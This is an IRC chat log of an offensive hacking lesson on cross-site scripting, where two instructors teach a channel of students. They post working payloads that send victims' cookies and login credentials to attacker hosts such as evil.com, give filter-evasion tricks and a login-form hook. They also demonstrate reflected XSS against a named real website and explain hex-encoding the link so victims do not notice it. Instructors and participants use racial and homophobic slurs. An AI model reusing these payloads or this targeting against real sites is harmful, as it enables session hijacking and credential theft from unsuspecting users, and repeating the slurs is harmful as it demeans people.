<~kr0> This lesson will be about Web App
<~kr0> idt so
<~kr0> This lesson will be about Web App
<~kr0> I'll cover a few things
<~kr0> I don't want this to get to long
<~kr0> anyway
<~kr0> we'll cover XSS for now
<~kr0> and then we'll go over to some other stuff as well
<~kr0> Okay
<~kr0> What is XSS ?
<~kr0> XSS Cross Site Scripting 
<~kr0> what does that mena
<~kr0> mean
<~kr0> we're trying to Inject our code into the Webpage 
<~kr0> Javascript
<~kr0> which is a pain in the ass
<~kr0> I hate Javascript with a passion
<~kr0> but anyway
<~kr0> XSS is a Client Side attack
<~kr0> which means
<~kr0> YOU CANT HACK A WEBSITE USING XSS
<~kr0> which is why XSS itself is pretty boring
<~kr0> but 
<~kr0> still relevant
<~kr0> Bug Bounty faggots care about XSS very much
<~kr0> bc they find one and get paid for that
<~kr0> or Whitehats 
<~kr0> eww
<~kr0> okay before I get into Deatil
<~kr0> detail
<~kr0> or there any questions yet
< tomcat23> yes
< tomcat23> if we can do xss
< tomcat23> can we get admin panel
< locoghost> so you're saying its client side so you have the client connecitng to the server?
< locoghost> have=hack
<&mona> tomcat23: XSS targets the client
<&mona> i.e.
<&mona> the users, not the server
<&mona> that being said
<~kr0> Client side means it targets the Client / user
<&mona> if you have XSS in a login form
<&mona> and the admin uses that form
<&mona> you can potentially steal their creds
<&mona> and gain access that way
< jhon> its mean you add some data into the search box?
<&mona> its very situational and context-specific
< jhon> some data means anything
<&mona> jhon: we'll get to the actual technique in a second
< tomcat23> i got it
<~kr0> okay
<~kr0> Lets get into Detail
<~kr0> XSS Targets the user of a Website
<~kr0> The Haxors trying to get user creds or cookies
<~kr0> how they do this ?
<~kr0> well
<~kr0> If you have a Webpage
<~kr0> with a Search box
<~kr0> you can insert something like 
<~kr0> <script>alert('XSS');</script
<&mona> >
<~kr0> yea :>
<~kr0> okay
<~kr0> what this will do is it creates a popup box saying 'XSS'
<~kr0> pretty lame 
<~kr0> but this prooves that this website is vuln
<~kr0> because you can inject code into the website 
<~kr0> most of the time it is not that easy
<~kr0> There are WAFS 
<~kr0> which are blocking some words
<~kr0> OR
<~kr0> which is unlikely
<&mona> small note: you shouldnt really use alert('XSS') as your test simply because a lot of shitty WAFs explicitly flag the alert() function or the word "XSS"
<~kr0> there are Devs that care about XSS
<~kr0> yea
<~kr0> stuff like
<~kr0> script , alert or most of the time blocked
<~kr0> (big websites)
<~kr0> but anyway
<~kr0> there are other ways to inject code
<~kr0> 1 sec
<~kr0> fuck phones ._.
<~kr0> okay
<~kr0> something like
<~kr0> <body onload=alert('XSS')>
<~kr0> which does the same thing as the syntax above 
<~kr0> but it could be a way to evade WAFs
<~kr0> which would mean 
<~kr0> as soon as the page is loaded : alert popup box with 'XSS'
<&mona> likewise you can replace your <script> tag with <script type="text/javascript">
<&mona> you might think no one is dumb enough to write a filter that shitty
<&mona> you would be wrong
<&mona> a lot of the filter evasion we referred to with SQLi applies here
<&mona> so varying case, trying to nest the elements you suspect are being filtered, etc
<&mona> quotes are commonly filtered out in PHP apps
<&mona> and you can get around that with JS's String.fromCharCode() function
<&mona> so instead of doing alert("XSS") for example
<&mona> var val = String.fromCharCode(120, 115, 115); alert(val)
<&mona> no quotes
<~kr0> ok
<~kr0> just to add something else for you 
<~kr0> <b onmouseover=alert('XSS')>click</b> 
<~kr0> which would be basically as soon as the mouse is over the "click" u get the popup
<~kr0> Now
<~kr0> WHY THE FUCK WOULD ANYONE CARE 
<~kr0> well
<~kr0> I used to thing like this
<~kr0> Then I saw the Beef XSS Framework
<~kr0> and I saw what javascript can do to your browser
<~kr0> okay
<~kr0> now lets talk about what hackers can do
<~kr0> > They steal ur cookies to impersonate you
<~kr0> > Trying to phish ur Creds
<&mona> part of the problem with xss is the default test case is alert() and that's all the "security researchers" ever do
<&mona> so people dont realize what it's capable of
<&mona> oh, so you can make a popup on my screen
<&mona> big deal
<&mona> you can log every key and mouseclick on a site with xss
<~kr0> OR
<~kr0> there is a method called "Pastejacking"
<~kr0> which replaces the thing you copied before
<~kr0> could maybe be something on a Website , something SE like
<~kr0> but you get the point 
<~kr0> This :
<~kr0> <img src="http://doesnt.exist" onerror=alert(document.cookie);>
<~kr0> could be a something a hacker could use to get ur cookie
<~kr0> which is basically
<~kr0> This is a Image : Wrong URL , If its a wrong URL inject that : 
<~kr0> document.cookie will display ur cookie
<~kr0> the only thing he got to do is :
<~kr0> <script>document.location="http://your_site.com/cookie_stealing_script.php?cookie="+document.cookie</script> 
<&mona> note that in this example we do an alert() with document.cookie, but there's no reason that the cookie cant be sent to a remote server
<&mona> ^ as kr0 just demonstrated
<~kr0> which sends a request to the hackers page with ur cookie at the end
<~kr0> then he could take that
<~kr0> inject ur cookie into his browser and could get ur Account
<~kr0> There are different ways to evade that 
<~kr0> as a website 
<~kr0> but you get the point
<~kr0> The Phishing part would be something like this
<~kr0> <script>
<~kr0> username=prompt('Please enter your username',' ');
<~kr0> password=prompt('Please enter your password',' ');
<~kr0> document.write("<img src=\"http://Your_Site.com/passwordAndUsernameStealer.php?username="+username+"&password="+password+"\">");
<~kr0> </script>
<~kr0> okay
<~kr0> This is a very simple example
<~kr0> but people could inject a complete site into that
<&mona> maybe time for some Q&A
<~kr0> This sends ur stuff to the hacker directly
<~kr0> yea
<~kr0> Okay
<~kr0> let me please finish XSS
<~kr0> its a pain :<
< torc> how to understand if a website is already compromised to XSS?
< anon1209> any demo ?
< D4rkL0rd> anon1209 you could try it here http://leettime.net/xsslab1/chalg1.php?name=
<~kr0> Websites can't get comprimised through XSS
< jumpiner> Didn't they use XSS to bypass Tor?
<~kr0> XSS is only Client Side
< tomcat23> if i found vulnerabilities using vega scanner
<~kr0> Thats why XSS is boring
< tomcat23> how to exploit them
< Namaste> just avoid clicking some suspicious JS link or shorten urls
< D4rkL0rd> jumpiner they didnt they used xs to bypass noscript which is is a plugin in tor browser (mozilla)
<~kr0> It usually gets send through a modified URL 
<~kr0> Okay
<~kr0> let me recap
<~kr0> There is no way you can attack a server through XSS
<~kr0> you could attack users 
<~kr0> or the admin
<~kr0> XSS sucks
<~kr0> How to aviod being attacked
<~kr0> avoid*
<~kr0> use NoScript
<~kr0> Blocks every Javascript on a page 
<~kr0> Okay
<&mona> i have a few closing notes about xss
<&mona> but we'll do a q&a first?
<~kr0> sure
< torc> how to understand if a website is already injected with XSS?
< Mieanoe> u said u can inject that code in a search box for example?
< jhon> i think you can also inject 
<~kr0> yea
<&mona> ok right
<~kr0> in a search box
<&mona> that's a good point
<&mona> i was assuming everyone here
<~kr0> in a GET request at the URL
<&mona> was present at the sqli and web app general lessons
<&mona> and understands how injection attacks generally work
<&mona> but for the complete novices amongst you
<&mona> XSS is an injection attack
<&mona> it relies on unsantizied input handling
<@anonymous> just like sqli
<&mona> yeah
<&mona> there's a few kinds of XSS
<&mona> but all the different types follow the same principle
<&mona> you put some javascript into an input
<&mona> such as a search box, any form, or a GET parameter
<&mona> stupid.com/stupid.php?input=<script>alert("XSS");</script>
<&mona> this input is then unsafely handled
<&mona> and at some point it is included in HTML
<&mona> or in some other context where you javascript can be viewed or executed
<&mona> there's a few diff kinds
<&mona> persistent XSS is something like a comment
<&mona> where you send data to the server,
<&mona> the server stores that data
<&mona> and the server then serves that data up to users
<&mona> so something like a comment on a blog
<&mona> where your comment is displayed to everyone who visits
<&mona> there's also reflected XSS, where the javascript isnt included permanently in the server
<&mona> so let's say there's an "ip-checker" site
<&mona> with a URL like
<&mona> ipchecker.com/?ip=127.0.0.1
<&mona> that shows
<&mona> "The country for 127.0.0.1 is blah blah"
<&mona> in that case, if XSS is present
<&mona> ipchecker.com/?ip=<script>alert("XSS");</script>
<&mona> that would display something like
<&mona> The country for  is blah blah
<&mona> and an alert box would pop up
<&mona> that's a simplistic example
<&mona> but it demonstrates how reflected xss works
<&mona> you're not storing any data on the server
<&mona> it's the link itself that causes the injection
<&mona> so you almost are making the user attack themselves
<&mona> they have to click that link
<&mona> (related to DOM-based XSS)
<&mona> everyone understand how xss itself actually works now?
<&mona> and what it is?
< Mieanoe> yep thanks
< F7sH7w> yep
< j4ck4l> ok these alerts are just testing for java
< jhon> good cool
< irca> got it!
< Hector0000> Kind of, so do i inject it through beef framework kinda?
< xneogeo> Yep
< FreeDom_> thanks
<&mona> Hector0000: only if you're a skid
< tomcat23> i  need a tutorial of beef frame work
<&mona> you shouldnt be using tools if you dont understand the process
< Hector0000> haha kk so what do i use
<&mona> we will not be teaching you how to use the beef framework
< MOS-6502> learn javascript
< j4ck4l> so if java then can insert evil.script form
<&mona> there are numerous youtube videos
< tomcat23> kk
<&mona> with an unregistered HyperCam logo
<&mona> and linkin park backgorund music
< MOS-6502> j4ck4l: javascript != java
<&mona> and 240p resolution
<&mona> to teach you that
< bluelightm2> haaha
<~kr0> lol
< jhon> lol
< D4rkL0rd> :p
<~kr0> okay
< jhon> that fucking videos
< jhon> sucks
< Hector0000> lol ok
<~kr0> mona: ur done ?
< tomcat23> :)
< bluelightm2> yeah
< skyler> give us some demo...
< j4ck4l> kk
<&mona> j4ck4l: if javaSCRIPT
<&mona> not java
<&mona> different
< jhon> demo yeah
<&mona> kr0: yup
< j4ck4l> yeah whats that test site
<~kr0> yea
<~kr0> I'll give you a Demo Page ina minute
<~kr0> and
<~kr0> I'd like to end this 
<~kr0> with something really Important
<~kr0> from a Whitehat named Joe Mccray
<~kr0> Credits where Credits belong 
<&mona> ew
<~kr0> ikr
<~kr0> but hes a nigger 
<~kr0> so I guess thare something else to him
<~kr0> drugs probably
<~kr0> but okay
<~kr0>  
<~kr0>  
<~kr0>  
<~kr0>  
<~kr0> The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
<~kr0>        
<~kr0>         1. Does the website talk to a DB?
<~kr0>                 - Look for parameter passing (ex: site.com/page.php?id=4)
<~kr0>                 - If yes - try SQL Injection
<~kr0>  
<~kr0>         2. Can I or someone else see what I type?
<~kr0>                 - If yes - try XSS
<~kr0>  
<~kr0>         3. Does the page reference a file?
<~kr0>                 - If yes - try LFI/RFI
<~kr0> LFI/RFI : https://bitbucket.org/OnionIRC/onionirc/raw/afd558eee5f23917990f04f4a6f9c8991b4124d7/OnionIRC_Logs/lfi_rfi.txt
<~kr0> SQLi : https://bitbucket.org/OnionIRC/onionirc/raw/afd558eee5f23917990f04f4a6f9c8991b4124d7/OnionIRC_Logs/sqli.txt
<~kr0> replace Web Assessment with Haxoring 
<~kr0> Okay
<&mona> note: to a whitehat, this is advanced exploitation techniques
<~kr0> yea 
<&mona> before we continue
<~kr0> they usually stop at that point
<&mona> we've given an example of a cookie-stealing xss injection
<&mona> do people want examples of other ways you can exploit xss?
< Namaste> yes
< Namaste> please
< tomcat23> s
<&mona> or would you like us to get on w/ it
< F7sH7w> of course
< pokaim> kr0: you're the nigger
< j4ck4l> go on
< jhon> show us please cooking stealing in real time
<~kr0> :(
<~kr0> nou
< bluelightm2> yeah
<~kr0> let me get something 
<~kr0> 1 sec
<&mona> kr0 is going to do a demon
<&mona> demo*
<&mona> lmao
<&mona> i'll go over some examples
<&mona> in the meantime
< locoghost> woa
< locoghost> kinky
< Hector0000> yess pls
<&mona> ok
<&mona> so
<&mona> a simple example of a cookie stealer
<&mona> if you can inject html
<&mona> is this:
<&mona> <iframe id="redirect" src="#" style="display:none"></iframe>
<&mona> <a onClick="document.getElementById('redirect').src = 'http://www.evil.com/evil.php?data='+escape(document.cookie);" href="#">Click here for details.</a>
<&mona> this injects an invisible iframe into the page
<&mona> and javascript part is an onclick event in a link
<&mona> when you click it, it changes the source of the iframe
<&mona> to your evil server with the GET parameter as the document.cookie object
<&mona> which sends the cookies to the server
<&mona> in this example, you may notice that the user needs to click a link
<&mona> that is not a requirement of XSS
<&mona> for example
<&mona> you could do something like
<&mona> url = "http://evil.com/evil.php?cookies=";
<&mona> data = document.cookie;
<&mona> new Image().src = url + data;
<&mona> that creates a new image which isn't added to the document
<&mona> but its source will still be loaded by most browsers
<&mona> and since its source is a request to your evil server along with the cookie jar in its GET parameters
<&mona> that causes the cookies to be sent to your server
<&mona> if you dont have the ability to inject html, only raw javascript
<&mona> that's fine
<&mona> because you can actually create and add objects
<&mona> to the page
<&mona> with just js
<&mona> for example
<&mona> incoming paste
<&mona> the iframe+link example from above
<&mona> can be done in javascript
<&mona> it takes more lines
<&mona> but it looks something like this:
<&mona> <script>
<&mona> var frame = document.createElement("iframe");
<&mona> frame.style.display = "none";
<&mona> document.body.appendChild(frame);
<&mona> var clickme = document.createElement("a");
<&mona> clickme.href = "#";
<&mona> clickme.onClick = function(){redirect(frame);}
<&mona> clickme.innerHTML = "I was generated with pure JS."
<&mona> document.body.appendChild(clickme);
<&mona> function redirect(in_frame)
<&mona> {
<&mona> 	in_frame.src = "http://www.evil.com/evil.php?data=" + escape(document.cookie);
<&mona> }
<&mona> </script>
<&mona> that creates an invisible iframe and adds it to the page
<&mona> then creates a link that calls the redirect() function when clicked
<&mona> and adds them both to the page
<&mona> the redirect() func does the cookie-stealing code which should be familiar by now
<&mona> the underlying point here is that there's loads of mechanisms by which you can perform your attacks
<&mona> you're not limited to phishing 
<&mona> get creativre
<&mona> make sense so far?
< j4ck4l> y
< F7sH7w> yeah it does
<&mona> ok
< fs> yeah
<&mona> on to phishing forms
<&mona> kr0 covered most of this
<&mona> but there is one thing worth nothing
<&mona> writing your own evil phishing form
<&mona> and making it look convincing
<&mona> that's hard work
<&mona> why bother when you can hook the original page's form?
<&mona> sometimes this wont work and you'll need fakery
<&mona> but it's often possible to just write some JS
<&mona> that will steal data from the original login form or whatever
<&mona> gonna be another pastedump in a sec
<&mona> let's say you have a login form in the page with XSS called "login"
<&mona> you can inject JS like this:
<&mona> <script>
<&mona> originalForm = document.forms["login"];
<&mona> function steal()
<&mona> {
<&mona> 	var frame = document.createElement("iframe");
<&mona> 	frame.style.display = "none";
<&mona> 	var details = "user=" + originalForm.user.value + "&pass=" + originalForm.password.value;
<&mona> 	frame.src = "http://evil.com/steal.php?" + details;
<&mona> 	document.body.appendChild(frame);
<&mona> }
<&mona> originalForm.onsubmit = steal();
<&mona> </script>
<&mona> that just
<&mona> hooks the original form as a javascript object
<&mona> defines a function to send cookies with data from the original form
<&mona> and executes the function as soon as you try to submit the original
<&mona> so when a user enters the username and pass and clicks "login"
<&mona> you code will strip
<&mona> originalForm.user.value
<&mona> and 
<&mona> originalForm.password.value
<&mona> and send it to your server as a GET request
<&mona> still good?
< Hector0000> how likely to be catched if u use injection? 
< jhon> cool
< F7sH7w> yeah
< Hector0000> and we need to have our own server to relay back to?
<~kr0> funny , ur name is hector
<&mona> Hector0000: same as any webapp attack
<&mona> lmao
< bluelightm2> a bit hard understand
<~kr0> SABU , GET OUT
< bluelightm2> to*
< nsa> beef
< D4rkL0rd> LOL 
<&mona> Hector0000: if you want to steal cookies or send data home, then yes
<~kr0> you guys want a real site to exploit , huh ?
< F7sH7w> yes
<~kr0> "exploit"
< bluelightm2> yup
<~kr0> okay
< skyler> yes
<~kr0> then 
<&mona> kr0 will do some shit now
< MOS-6502> inb4 we all get exploited by kr0
< jhon> sounds good
<&mona> i'll just close by saying that for the keylogging part i wont paste an example
<~kr0> exactly
< anon1209> yea
<~kr0> Ima hax u all
<&mona> just google "javascript keylooger"
< tomcat23> some information about beeef
< tomcat23> some information about beeef
<&mona> there are 10 million out there
<~kr0> Okay
<~kr0> http://www.warnerbros.com/search
<~kr0> ?qt=<img src="http://doesnt.exist" onerror=alert('XSS');>
<~kr0> &s_b=
<~kr0> see
<~kr0> the ?qt parameter 
<~kr0> we use our payload from before 
<~kr0> http://www.warnerbros.com/search?qt=%3Cimg%20src=%22http://doesnt.exist%22%20onerror=alert%28%27XSS%27%29;%3E&s_b=
<~kr0> if you open this url
<&mona> (make sure you enable javascript in tor browser to see the effects)
<~kr0> funny fact
<~kr0> Tor by Default doesn't block Javascript
<&mona> if you're smart
<&mona> it should at this point :V
<&mona> also you may need to do an unsafe reload
<~kr0> yea
<&mona> also did i ever tell you i love you
<&mona> that is a great example 
<~kr0> most likely it hits NoScript's blacklist
<&mona> that's an example of reflected xss
<&mona> we're not storing data permanently 
<&mona> on WB's server
<&mona> the xss in the URL that you visit
<~kr0> okaaaay
<~kr0> as you can see
<~kr0> even updated websites
<~kr0> are vuln
<~kr0> now Imagine 
<~kr0> someone is injecting some bad javascript into this
<~kr0> and the like
<~kr0> then*
<~kr0> " Hey look , WarnerBros made an Awesome movie , take a look : TheURL"
<~kr0> bam boom
<~kr0> Injected bad Javascript
<~kr0> It could redirect you to different page
<~kr0> steal cookies
<~kr0> or whatever
<~kr0> you get the point
<~kr0> Any questions ?
< Drikizdas> what if you use an url shortener, will it still work?
<~kr0> yes
< Drikizdas> nice
< user_two> do web sites log urls that are visited like that?
< anon1209> the link please ,i missed that
< Mieanoe> if u inject that code in waner bros page, could u get cookies for other pages?
< j4ck4l> i went to url in tor browser and it redirects me to http://www.warnerbros.com/#324359260783202561
< bluelightm2> that time it was much easier to understand
<&mona> j4ck4l: that's your XSS protection kicking in
< D4rkL0rd> user two they will because Http uses TCP
<~kr0> http://www.warnerbros.com/search?qt=%3Cimg%20src=%22http://doesnt.exist%22%20onerror=alert%28%27XSS%27%29;%3E&s_b=
<&mona> there's probably popup on your screen saying "NoSciprt detect a cross-site scripting attempt" or something
<&mona> i tested the link, it definitely works
<~kr0> Yea 
<~kr0> I didn't fuck up
<~kr0> (this time)
< bluelightm2> the popup was "xss"
<~kr0> yea
< Hector0000> i c it
< irca> nice
< j4ck4l> unsafe reload popup xss
< Hector0000> what if ppl open it in chrome? it ll work then?
< locoghost> man I always have to jet when a class is in session. Thanks kr0 and mona for the lesson
< anon1209> popup xss
< j4ck4l> ok
<~kr0> Okay 
< j4ck4l> but that doesnt stay there for everyone. just us who goto that link
< tomcat23> i like the class today
<~kr0> last few words from me 
<~kr0> j4ck4l: 
<~kr0> yes 
<~kr0> Its a client side attack
<~kr0> Your Browser does the job here 
<~kr0> Hector0000: 
<~kr0> Firefox,chrome,Opera
<~kr0> all of them handle that differently
<~kr0> Its hard to explain on a tech low level
<~kr0> lets say it like that
<~kr0> You inject could which is used by Devs as well
<~kr0> Thats why its hard to block these sttributes by default
<~kr0> Then it depends on how they handle the DOM 
<~kr0> but that would be pretty advanced
<~kr0> Okay
< j4ck4l> k eh/
<~kr0> CLASS DISMISSED
< tomcat23> i want to know about beef
< Hector0000> cool thanks
< Hector0000> awesome
< tomcat23> i want to know about beef
< tomcat23> any source
< j4ck4l> qna?
< Mieanoe> thanks
< Drikizdas> when is the next class?
< Hector0000> tomcat go to null byte 
< tomcat23> thnx
< j4ck4l> ty kr0
<&mona> final note
< j4ck4l> ty mona
< Hector0000> thanks guys
<&mona> you may think that getting someone to click that obvious-looking link
<&mona> with xss right there in it
< anon1209> tysm
<&mona> would be impossible
<&mona> but you can easily encode it
<&mona> for example:
<&mona> www.warnerbros.com/search?qt=%3c%69%6d%67 %73%72%63%3d%22%68%74%74%70%3a%2f%2f%64%6f%65%73%6e%74%2e%65%78%69%73%74%22 %6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%27%58%53%53%27%29%3b%3e&s_b=
< MEH> awesome stuff! 
<&mona> that link is identical to the one kr0 posted, just encoded
< Hector0000> in?
<&mona> this works best if you have a very small xss payload that doesnt encode to many characters
< Namaste> hex ? 
<&mona> Hector0000: encoded in ascii hex representation
<&mona> yes
<&mona> if you follow the link
< xneogeo> thanks
<&mona> it will have the exact same effect
< Hector0000> oh thought so
<&mona> your browser interprets it
<&mona> when working with reflected XSS in a url it's a good idea to encode it that way
<&mona> to make it less obvious
<&mona> and as a final, final note
< D4rkL0rd> sorry got disconnected for a min, thanks mona and kr0
<&mona> well, kr0's just demonstrated that xss is still found in the wild
<&mona> but even so
< j4ck4l> so in theory iu could make a blank page with a script url that gives me my login box?
<&mona> if you really want to find juicy xss in the modern world
<&mona> when people are conscious of xss and actively working to avoid it
<&mona> don't limit yourself to javascript injection in webpages
<&mona> for example, .swf flash objects
<&mona> include the functionality to interpret URLs
<&mona> and raw HTML
<&mona> and can take in input
<&mona> that means that SWFs are potentially vulnerable to XSS
<&mona> and because they're not traditional targets
<&mona> successful xss is way more become
<&mona> because
<&mona> a) shitty media companies arent security conscious, and they're the ones writing Flash
<&mona> b) xss in flash is not as common as in html
<&mona> have fun kids, hack safely <3
<&mona> LOG ENDS HERE
Log closed Sat Jun 04 18:06:35 2016
